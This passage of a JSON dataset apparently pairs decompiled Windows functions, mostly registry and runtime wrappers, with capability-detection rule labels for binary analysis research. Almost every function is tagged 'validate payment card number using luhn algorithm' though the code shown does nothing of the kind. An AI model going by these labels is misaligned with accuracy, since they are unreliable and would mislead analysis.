        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nvoid __fastcall fcn.0041ee74(uint param_1, char param_2)\n\n{\n    uchar *puVar1;\n    char cVar2;\n    int32_t *in_EAX;\n    uint *in_FS_OFFSET;\n    uint uStack40;\n    uint uStack36;\n    uchar *puStack32;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_1h;\n    \n    puStack32 = &fcn.0041ee74::var_1h + 1;\n    uStack36 = 0x41ef0c;\n    uStack40 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd8;\n    puVar1 = &fcn.0041ee74::var_1h + 1;\n    if (param_2 != '\\0') {\n        (**(*in_EAX + 0x28))();\n        fcn.0041e990();\n        fcn.0041e990();\n        puVar1 = puStack32;\n    }\n    while( true ) {\n        puStack32 = puVar1;\n        cVar2 = fcn.0041cbe8();\n        if (cVar2 != '\\0') break;\n        fcn.0041ee2c();\n        puVar1 = puStack32;\n    }\n    fcn.0041dca4();\n    while( true ) {\n        cVar2 = fcn.0041cbe8();\n        if (cVar2 != '\\0') break;\n        fcn.0041ee74();\n    }\n    fcn.0041dca4();\n    *in_FS_OFFSET = uStack40;\n    puStack32 = 0x41ef13;\n    uStack36 = 0x41ef0b;\n    fcn.00405554();\n    return;\n}\n",
        "token_count": 416
    },
    "0041f088": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0041f088(uint param_1, int32_t param_2)\n\n{\n    if (0 < param_2) {\n        do {\n            if (param_2 < 0x101) {\n                fcn.0041d004();\n                param_2 = 0;\n            }\n            else {\n                fcn.0041d004();\n                param_2 = param_2 + -0x100;\n            }\n        } while (0 < param_2);\n    }\n    return;\n}\n",
        "token_count": 113
    },
    "0041f0d0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0041f0d0(uint arg_8h)\n\n{\n    char cVar1;\n    ushort *in_EAX;\n    int32_t *in_FS_OFFSET;\n    int32_t iStack84;\n    uint uStack80;\n    uchar *puStack76;\n    int32_t iStack60;\n    uint uStack56;\n    uchar *puStack52;\n    int32_t iStack48;\n    uint uStack44;\n    uchar *puStack40;\n    int32_t var_1ch;\n    int32_t var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack40 = &stack0xfffffffc;\n    uStack44 = 0x41f279;\n    iStack48 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd0;\n    puStack52 = 0x41f0fc;\n    fcn.0041caa0();\n    puStack52 = 0x41f10d;\n    fcn.00404620();\n    uStack56 = 0x41f254;\n    iStack60 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffc4;\n    puStack52 = &stack0xfffffffc;\n    fcn.00404620();\n    fcn.0041d004();\n    fcn.0041b7b4(var_18h, var_18h >> 0x1f);\n    fcn.0041d004();\n    puStack76 = 0x41f176;\n    fcn.0041c334(0x400);\n    uStack80 = 0x41f22f;\n    iStack84 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffac;\n    puStack76 = &stack0xfffffffc;\n    fcn.0041e9cc();\n    fcn.0041d004();\n    fcn.0041b7b4(var_18h, var_18h >> 0x1f);\n    fcn.0041d004();\n    cVar1 = fcn.0041623c();\n    if (cVar1 != '\\0') {\n        fcn.0040700c();\n        cVar1 = fcn.0040f980();\n        if (cVar1 != '\\0') goto code_r0x0041f202;\n    }\n    fcn.0040dbc0();\n    fcn.00404ec4();\ncode_r0x0041f202:\n    *in_EAX = *(var_1ch + 4);\n    (**(_pe_dos_header + 0xc))();\n    *in_FS_OFFSET = var_18h;\n    iStack84 = 0x41f236;\n    fcn.00404650();\n    return;\n}\n",
        "token_count": 627
    },
    "0041f9e0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __fastcall fcn.0041f9e0(uchar param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    uchar extraout_CL;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint in_stack_ffffffb4;\n    uint uStack56;\n    uint uStack52;\n    uchar *puStack48;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_1h;\n    \n    if (param_2 != '\\0') {\n        puStack48 = 0x41f9f9;\n        in_EAX = fcn.00404974();\n        param_2 = extraout_DL;\n        param_1 = extraout_CL;\n    }\n    uStack52 = 0x41fa8a;\n    uStack56 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffc8;\n    puStack48 = &fcn.0041f9e0::var_1h + 1;\n    var_1h._0_1_ = param_2;\n    fcn.00404620();\n    fcn.0041f748();\n    *(in_EAX + 0xe) = param_1;\n    *(in_EAX + 0xc) = param_1;\n    iVar1 = fcn.004054b4(in_EAX + 8, 4, in_EAX);\n    *(in_EAX + 4) = iVar1;\n    if (iVar1 == 0) {\n        sub.kernel32.dll_GetLastError_1();\n        fcn.0040d2f0();\n        var_ch = 0;\n        var_8h._0_1_ = 0xb;\n        in_stack_ffffffb4 = 0;\n        fcn.0040dbfc(0, &fcn.0041f9e0::var_ch);\n        fcn.00404ec4();\n    }\n    *in_FS_OFFSET = in_stack_ffffffb4;\n    fcn.00405530(0x41fa91);\n    return;\n}\n",
        "token_count": 486
    },
    "0041fb30": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __fastcall fcn.0041fb30(uint param_1, int32_t param_2)\n\n{\n    uchar *puVar1;\n    uint *in_FS_OFFSET;\n    uint in_stack_ffffffd0;\n    uint uStack40;\n    uint uStack36;\n    uchar *puStack32;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    int32_t var_8h;\n    uint var_4h;\n    \n    puStack32 = &stack0xfffffffc;\n    uStack36 = 0x41fb9e;\n    uStack40 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack40;\n    puVar1 = &stack0xfffffffc;\n    if (param_2 != 0) {\n        fcn.0040d2f0();\n        var_10h = 0;\n        var_ch._0_1_ = 0xb;\n        var_4h._0_1_ = 0;\n        in_stack_ffffffd0 = 1;\n        var_8h = param_2;\n        fcn.0040dbfc(1, &var_10h);\n        fcn.00404ec4();\n        puVar1 = puStack32;\n    }\n    puStack32 = puVar1;\n    *in_FS_OFFSET = in_stack_ffffffd0;\n    uStack40 = 0x41fba5;\n    fcn.00405530();\n    return;\n}\n",
        "token_count": 331
    },
    "0041ff70": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.0041ff70(int32_t param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    int32_t extraout_ECX;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uStack28;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.00404974();\n        param_1 = extraout_ECX;\n        param_2 = extraout_DL;\n    }\n    *(in_EAX + 0x24) = *0x41ffb8;\n    if (param_1 != 0) {\n        fcn.0042012c();\n    }\n    if (param_2 != '\\0') {\n        fcn.004049cc();\n        *in_FS_OFFSET = uStack28;\n    }\n    return in_EAX;\n}\n",
        "token_count": 186
    },
    "004204e0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004204e0(uint param_1, int32_t param_2)\n\n{\n    char cVar1;\n    int32_t *in_EAX;\n    bool bVar2;\n    int32_t iStack20;\n    uchar uStack16;\n    \n    bVar2 = *0x10 == 0x14;\n    fcn.00405974();\n    if (!bVar2) {\n        if (param_2 != 0) {\n            cVar1 = fcn.00409c60();\n            if (cVar1 == '\\0') {\n                uStack16 = 0xb;\n                iStack20 = param_2;\n                fcn.0040dbfc(0, &iStack20);\n                fcn.00404ec4();\n            }\n        }\n        if (in_EAX[1] == NULL) {\n            (**(*in_EAX + 0x20))(param_2);\n        }\n        else {\n            (**(*in_EAX[1] + 0x20))(param_2);\n        }\n        fcn.00420664();\n        fcn.00420570();\n        fcn.00420664();\n    }\n    return;\n}\n",
        "token_count": 258
    },
    "00420664": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00420664(uint param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    int32_t *piVar1;\n    \n    if (*(in_EAX + 4) != 0) {\n        fcn.004057e8();\n        piVar1 = fcn.00404924();\n        if (piVar1 != NULL) {\n            if (param_2 == '\\0') {\n                *piVar1 = 0;\n            }\n            else {\n                *piVar1 = in_EAX;\n            }\n        }\n    }\n    return;\n}\n",
        "token_count": 130
    },
    "00420894": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.00420894(uint param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uStack24;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.00404974();\n        param_2 = extraout_DL;\n    }\n    fcn.0041ff70();\n    uVar1 = fcn.00404620();\n    *(in_EAX + 0x50) = uVar1;\n    if (param_2 != '\\0') {\n        fcn.004049cc();\n        *in_FS_OFFSET = uStack24;\n    }\n    return in_EAX;\n}\n",
        "token_count": 166
    },
    "00420a8c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00420a8c(uint arg_8h)\n\n{\n    int32_t in_EAX;\n    uint in_ECX;\n    uint extraout_ECX;\n    char in_DL;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uStack32;\n    \n    if (in_DL != '\\0') {\n        in_EAX = fcn.00404974();\n        in_ECX = extraout_ECX;\n        in_DL = extraout_DL;\n    }\n    fcn.00404620();\n    *(in_EAX + 0xc) = in_ECX;\n    *(in_EAX + 0x10) = arg_8h;\n    if (in_DL != '\\0') {\n        fcn.004049cc();\n        *in_FS_OFFSET = uStack32;\n    }\n    return in_EAX;\n}\n",
        "token_count": 186
    },
    "00421008": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00421008(uint noname_0, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    code **in_ECX;\n    \n    (**in_ECX)(arg_ch, arg_10h, arg_14h);\n    return 0;\n}\n",
        "token_count": 66
    },
    "004215d8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.004215d8(void)\n\n{\n    uchar auStack12 [4];\n    uchar uStack8;\n    \n    uStack8 = 0xb;\n    fcn.0040dbfc(0, auStack12);\n    fcn.00404ec4();\n    return;\n}\n",
        "token_count": 64
    },
    "00421670": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.00421670(uint param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uStack24;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.00404974();\n        param_2 = extraout_DL;\n    }\n    fcn.0042174c();\n    *(in_EAX + 0x18) = 0xf003f;\n    *(in_EAX + 0xc) = 1;\n    if (param_2 != '\\0') {\n        fcn.004049cc();\n        *in_FS_OFFSET = uStack24;\n    }\n    return in_EAX;\n}\n",
        "token_count": 164
    },
    "004216b4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.004216b4(uint param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    uint extraout_ECX;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uStack28;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.00404974();\n        param_1 = extraout_ECX;\n        param_2 = extraout_DL;\n    }\n    fcn.00421670();\n    *(in_EAX + 0x18) = param_1;\n    if (param_2 != '\\0') {\n        fcn.004049cc();\n        *in_FS_OFFSET = uStack28;\n    }\n    return in_EAX;\n}\n",
        "token_count": 165
    },
    "004217b4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __fastcall fcn.004217b4(uint param_1, uint param_2)\n\n{\n    char cVar1;\n    uint uVar2;\n    int32_t iVar3;\n    uint *in_FS_OFFSET;\n    uint uStack48;\n    uint uStack44;\n    uchar *puStack40;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint hKey;\n    uint var_4h;\n    \n    puStack40 = &stack0xfffffffc;\n    var_4h = 0;\n    uStack44 = 0x421880;\n    uStack48 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd0;\n    hKey = 0;\n    fcn.004055c8();\n    cVar1 = fcn.00421604();\n    if (cVar1 == '\\0') {\n        fcn.00405a84();\n    }\n    uVar2 = fcn.004059dc(0, 0, 0, 0xf003f, 0, &fcn.004217b4::hKey, &fcn.004217b4::var_ch);\n    uVar2 = fcn.0042179c(uVar2);\n    iVar3 = sub.advapi32.dll_RegCreateKeyExA(uVar2);\n    if (iVar3 == 0) {\n        uVar2 = 0x421844;\n        sub.advapi32.dll_RegCloseKey_1(hKey);\n    }\n    else {\n        var_10h._0_1_ = 0xb;\n        uVar2 = 0;\n        var_14h = param_2;\n        fcn.0040dbfc(0, &fcn.004217b4::var_14h);\n        fcn.00404ec4();\n    }\n    *in_FS_OFFSET = uVar2;\n    fcn.00405530(0x421887);\n    return;\n}\n",
        "token_count": 433
    },
    "00421d84": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop",
            "query or enumerate registry key"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00421d84(uint param_1, int32_t *param_2)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    uint uVar2;\n    int32_t iVar3;\n    uint *in_FS_OFFSET;\n    uint uStack72;\n    uint uStack68;\n    uchar *puStack64;\n    uint var_2ch;\n    int32_t var_28h;\n    int32_t var_24h;\n    int32_t var_ch;\n    int32_t *var_8h;\n    uint var_4h;\n    \n    puStack64 = &stack0xfffffffc;\n    var_4h = 0;\n    uStack68 = 0x421e3c;\n    uStack72 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffb8;\n    var_8h = param_2;\n    (**(*param_2 + 0x44))();\n    cVar1 = fcn.00421d1c();\n    if (cVar1 != '\\0') {\n        fcn.00405620();\n        if (-1 < var_28h + -1) {\n            iVar3 = 0;\n            do {\n                var_ch = var_24h + 1;\n                uVar2 = fcn.004059dc(&fcn.00421d84::var_ch, 0, 0, 0, 0);\n                sub.advapi32.dll_RegEnumKeyExA(*(in_EAX + 4), iVar3, uVar2);\n                fcn.004059dc();\n                fcn.00405728();\n                (**(*var_8h + 0x38))();\n                iVar3 = iVar3 + 1;\n                var_28h = var_28h + -1;\n            } while (var_28h != 0);\n        }\n    }\n    *in_FS_OFFSET = uStack72;\n    puStack64 = 0x421e43;\n    uStack68 = 0x421e33;\n    fcn.00405530();\n    uStack68 = 0x421e3b;\n    fcn.00405530();\n    return;\n}\n",
        "token_count": 473
    },
    "00421e4c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop",
            "query or enumerate registry value"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00421e4c(uint param_1, int32_t *param_2)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    uint uVar2;\n    int32_t iVar3;\n    uint *in_FS_OFFSET;\n    uint uStack72;\n    uint uStack68;\n    uchar *puStack64;\n    uint var_2ch;\n    uint var_28h;\n    int32_t var_20h;\n    int32_t var_1ch;\n    int32_t var_ch;\n    int32_t *var_8h;\n    uint var_4h;\n    \n    puStack64 = &stack0xfffffffc;\n    var_4h = 0;\n    uStack68 = 0x421f04;\n    uStack72 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffb8;\n    var_8h = param_2;\n    (**(*param_2 + 0x44))();\n    cVar1 = fcn.00421d1c();\n    if (cVar1 != '\\0') {\n        fcn.00405620();\n        if (-1 < var_20h + -1) {\n            iVar3 = 0;\n            do {\n                var_ch = var_1ch + 1;\n                uVar2 = fcn.004059dc(&fcn.00421e4c::var_ch, 0, 0, 0, 0);\n                sub.advapi32.dll_RegEnumValueA(*(in_EAX + 4), iVar3, uVar2);\n                fcn.004059dc();\n                fcn.00405728();\n                (**(*var_8h + 0x38))();\n                iVar3 = iVar3 + 1;\n                var_20h = var_20h + -1;\n            } while (var_20h != 0);\n        }\n    }\n    *in_FS_OFFSET = uStack72;\n    puStack64 = 0x421f0b;\n    uStack68 = 0x421efb;\n    fcn.00405530();\n    uStack68 = 0x421f03;\n    fcn.00405530();\n    return;\n}\n",
        "token_count": 480
    },
    "00421f64": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.00421f64(void)\n\n{\n    char cVar1;\n    uint uVar2;\n    uint uStack12;\n    \n    cVar1 = fcn.00421f14();\n    uVar2 = uStack12;\n    if (cVar1 == '\\0') {\n        uVar2 = 0xffffffff;\n    }\n    return CONCAT44(uStack12, uVar2);\n}\n",
        "token_count": 88
    },
    "00421f8c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.00421f8c(void)\n\n{\n    char cVar1;\n    uint32_t uVar2;\n    uint8_t uStack16;\n    uint uStack12;\n    \n    cVar1 = fcn.00421f14();\n    if (cVar1 == '\\0') {\n        uVar2 = 0;\n    }\n    else {\n        uVar2 = uStack16;\n    }\n    return CONCAT44(uStack12, uVar2);\n}\n",
        "token_count": 103
    },
    "00422134": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "set registry value"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.00422134(uint arg_8h, uint arg_ch)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    int32_t iVar2;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    uVar1 = fcn.00421618();\n    uVar1 = fcn.004059dc(0, uVar1, var_4h, arg_ch);\n    iVar2 = sub.advapi32.dll_RegSetValueExA(*(in_EAX + 4), uVar1);\n    if (iVar2 != 0) {\n        var_8h._0_1_ = 0xb;\n        fcn.0040dbfc(0, &var_ch);\n        fcn.00404ec4();\n    }\n    return;\n}\n",
        "token_count": 190
    },
    "0042219c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "query or enumerate registry value"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl fcn.0042219c(uchar *arg_8h, uint arg_ch)\n\n{\n    uchar uVar1;\n    int32_t in_EAX;\n    uint uVar2;\n    int32_t iVar3;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_4h = 0;\n    uVar2 = fcn.004059dc(0, &var_4h);\n    iVar3 = sub.advapi32.dll_RegQueryValueExA_1(*(in_EAX + 4), uVar2);\n    if (iVar3 != 0) {\n        var_8h._0_1_ = 0xb;\n        fcn.0040dbfc(0, &var_ch);\n        fcn.00404ec4();\n    }\n    uVar1 = fcn.00421648();\n    *arg_8h = uVar1;\n    return arg_ch;\n}\n",
        "token_count": 218
    },
    "00422210": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00422210(void)\n\n{\n    fcn.00421f14();\n    return;\n}\n",
        "token_count": 24
    },
    "00422220": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00422220(void)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    uint uVar2;\n    uint *in_FS_OFFSET;\n    uint uStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack24 = &stack0xfffffffc;\n    var_4h = 0;\n    uStack28 = 0x4222a6;\n    uStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack32;\n    fcn.004055c8();\n    cVar1 = fcn.00421604();\n    if (cVar1 == '\\0') {\n        fcn.00405a84();\n    }\n    var_8h = 0;\n    uVar2 = fcn.004059dc(0, *(in_EAX + 0x18), &var_8h);\n    uVar2 = fcn.0042179c(uVar2);\n    sub.advapi32.dll_RegOpenKeyExA_1();\n    *in_FS_OFFSET = uVar2;\n    fcn.00405530(0x4222ad);\n    return;\n}\n",
        "token_count": 266
    },
    "004222b8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.004222b8(void)\n\n{\n    uint32_t uVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    int32_t *in_FS_OFFSET;\n    int32_t iStack36;\n    int32_t iStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint var_ch;\n    uint var_4h;\n    \n    puStack24 = &stack0xfffffffc;\n    uVar1 = *(in_EAX + 0x18);\n    uStack28 = 0x42231d;\n    iStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe0;\n    *(in_EAX + 0x18) = uVar1 & 0x300 | 0x20009;\n    iStack36 = 0x4222f4;\n    iVar2 = fcn.00422220();\n    if (iVar2 != 0) {\n        sub.advapi32.dll_RegCloseKey_1();\n        iStack36 = iVar2;\n    }\n    *in_FS_OFFSET = iStack36;\n    *(in_EAX + 0x18) = uVar1;\n    return;\n}\n",
        "token_count": 260
    },
    "00422330": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00422330(int32_t arg_8h)\n\n{\n    int32_t arg_ch;\n    uint arg_ch_00;\n    uint32_t arg_8h_00;\n    uint32_t *in_FS_OFFSET;\n    uint32_t uStack76;\n    uint uStack72;\n    uchar *puStack68;\n    uint32_t uStack56;\n    uint uStack52;\n    uchar *puStack48;\n    uint32_t uStack44;\n    uint uStack40;\n    uchar *puStack36;\n    uint8_t var_11h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_8h = *(*(arg_8h + -4) + 4);\n    puStack36 = 0x422355;\n    fcn.004217b0();\n    uStack40 = 0x422443;\n    uStack44 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd4;\n    puStack48 = 0x422370;\n    puStack36 = &stack0xfffffffc;\n    arg_ch = fcn.00421f64();\n    if (0 < arg_ch) {\n        puStack48 = 0x422381;\n        var_10h = fcn.00402ee8();\n        uStack52 = 0x422420;\n        uStack56 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffc8;\n        puStack68 = 0x4223a7;\n        puStack48 = &stack0xfffffffc;\n        arg_ch_00 = fcn.0042219c(&stack0xffffffeb, arg_ch);\n        var_ch = *(*(arg_8h + -4) + 4);\n        puStack68 = 0x4223c3;\n        fcn.004217b0();\n        uStack72 = 0x422403;\n        uStack76 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffb4;\n        arg_8h_00 = var_11h;\n        puStack68 = &stack0xfffffffc;\n        fcn.00422134(arg_8h_00, arg_ch_00);\n        *in_FS_OFFSET = arg_8h_00;\n        uStack76 = 0x42240a;\n        fcn.004217b0();\n        return;\n    }\n    *in_FS_OFFSET = uStack44;\n    puStack36 = 0x42244a;\n    uStack40 = 0x422442;\n    fcn.004217b0();\n    return;\n}\n",
        "token_count": 576
    },
    "00422450": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop",
            "query or enumerate registry value"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00422450(uint arg_8h)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint *in_FS_OFFSET;\n    uint arg_8h_00;\n    uint uStack88;\n    uint uStack84;\n    uchar *puStack80;\n    uint uStack76;\n    uint uStack72;\n    uchar *puStack68;\n    uint var_30h;\n    uint var_2ch;\n    int32_t var_24h;\n    int32_t var_20h;\n    uint var_10h;\n    int32_t var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack68 = &stack0xfffffffc;\n    var_4h = 0;\n    uStack72 = 0x422567;\n    uStack76 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffb4;\n    puStack80 = 0x42248d;\n    fcn.004217b0();\n    uStack84 = 0x422542;\n    uStack88 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffa8;\n    puStack80 = &stack0xfffffffc;\n    cVar1 = fcn.00421d1c();\n    if (cVar1 != '\\0') {\n        fcn.00422330(arg_8h);\n        fcn.00405620();\n        if (-1 < var_24h + -1) {\n            do {\n                var_ch = var_20h + 1;\n                fcn.004059dc(&fcn.00422450::var_ch, 0, 0, 0, 0);\n                iVar2 = sub.advapi32.dll_RegEnumValueA();\n                if (iVar2 == 0) {\n                    arg_8h_00 = arg_8h;\n                    fcn.004059dc();\n                    fcn.00405728();\n                    fcn.00422330(arg_8h_00);\n                }\n                var_24h = var_24h + -1;\n            } while (var_24h != 0);\n        }\n    }\n    *in_FS_OFFSET = uStack88;\n    puStack80 = 0x422549;\n    uStack84 = 0x422541;\n    fcn.004217b0();\n    return;\n}\n",
        "token_count": 512
    },
    "00423968": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.00423968(ushort param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    ushort extraout_CX;\n    char extraout_DL;\n    int32_t *in_FS_OFFSET;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.00404974();\n        param_1 = extraout_CX;\n        param_2 = extraout_DL;\n    }\n    *(in_EAX + 0x20) = param_1;\n    sub.kernel32.dll_InitializeCriticalSection();\n    if (param_2 != '\\0') {\n        fcn.004049cc();\n        *in_FS_OFFSET = in_EAX + 8;\n    }\n    return in_EAX;\n}\n",
        "token_count": 165
    },
    "004239c8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.004239c8(void)\n\n{\n    int32_t in_EAX;\n    \n    sub.kernel32.dll_EnterCriticalSection(in_EAX + 8);\n    return;\n}\n",
        "token_count": 39
    },
    "004239d4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.004239d4(void)\n\n{\n    int32_t in_EAX;\n    \n    sub.kernel32.dll_LeaveCriticalSection(in_EAX + 8);\n    return;\n}\n",
        "token_count": 40
    },
    "00423b88": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00423b88(uint param_1, int32_t param_2)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint *in_FS_OFFSET;\n    uint uStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack28 = 0x423ba1;\n    fcn.004239c8();\n    uStack32 = 0x423bf1;\n    uStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffdc;\n    iVar1 = *(param_2 + 0x10);\n    puStack28 = &stack0xfffffffc;\n    iVar2 = fcn.004239e0();\n    *(param_2 + 0x10) = iVar2;\n    if (iVar1 != iVar2) {\n        fcn.0040484c();\n    }\n    fcn.00423ac4();\n    *in_FS_OFFSET = uStack36;\n    puStack28 = 0x423bf8;\n    uStack32 = 0x423bf0;\n    fcn.004239d4();\n    return;\n}\n",
        "token_count": 263
    },
    "00423cf0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
